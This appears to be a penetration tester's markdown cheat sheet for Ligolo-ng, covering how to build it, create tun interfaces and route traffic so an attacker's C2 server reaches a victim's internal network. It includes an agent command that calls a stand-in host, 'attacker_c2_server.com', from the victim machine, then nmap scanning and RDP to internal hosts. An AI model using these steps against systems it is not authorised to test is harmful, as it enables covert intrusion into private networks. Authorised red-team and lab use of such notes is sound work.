# Ligolo-ng 

## Github repo: https://github.com/nicocha30/ligolo-ng

## Precompiled Binaries: https://github.com/nicocha30/ligolo-ng/releases

# Build

- go build -o agent cmd/agent/main.go

- go build -o proxy cmd/proxy/main.go

- Build for Windows

- GOOS=windows go build -o agent.exe cmd/agent/main.go

- GOOS=windows go build -o proxy.exe cmd/proxy/main.go

# Setup

## Linux

- sudo ip tuntap add user YOUR_USERNAME mode tun ligolo

- sudo ip link set ligolo up

## Windows

### You need to download the Wintun driver (used by WireGuard) and place the wintun.dll in the same folder as Ligolo (make sure you use the right architecture).

### Links: https://www.wintun.net/

### Start the proxy server on your Command and Control (C2) server (default port 11601):

- ./proxy -h  (Help options)

- ./proxy -autocert (Automatically request LetsEncrypt certificates)

# Usage

 -  ./agent -connect attacker_c2_server.com:11601 (Start the agent on your target (victim) computer (no privileges are required!)

## TIP: If you want to tunnel the connection over a SOCKS5 proxy, you can use the --socks ip:port option. You can specify SOCKS credentials using the --socks-user and --socks-pass arguments.

### A session should appear on the proxy server.

 - INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000" (Example)

### Use the session command to select the agent.

 - ligolo-ng » session 

 - ? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000

### Display the network configuration of the agent using the ifconfig command:

 - [Agent : nchatelain@nworkstation] » ifconfig

### Add a route on the proxy/relay server to the 192.168.0.0/24 agent network.

 - sudo ip route add 192.168.0.0/24 dev ligolo (Linux)

 - netsh int ipv4 show interfaces

 - route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE_INTERFACE_IDX] (Windows)

### Start the tunnel on the proxy

 - [Agent : nchatelain@nworkstation] » tunnel_start

 - [Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   

### You can also specify a custom tuntap interface using the --tun iface option:

 - [Agent : nchatelain@nworkstation] » tunnel_start --tun MY_CUSTOM_TUN_TAP

 - [Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   

### You can now access the 192.168.0.0/24 agent network from the proxy server.

## Examples:

 - $ nmap 192.168.0.0/24 -v -sV -n

 - [...]

 - $ rdesktop 192.168.0.123

 - [...]
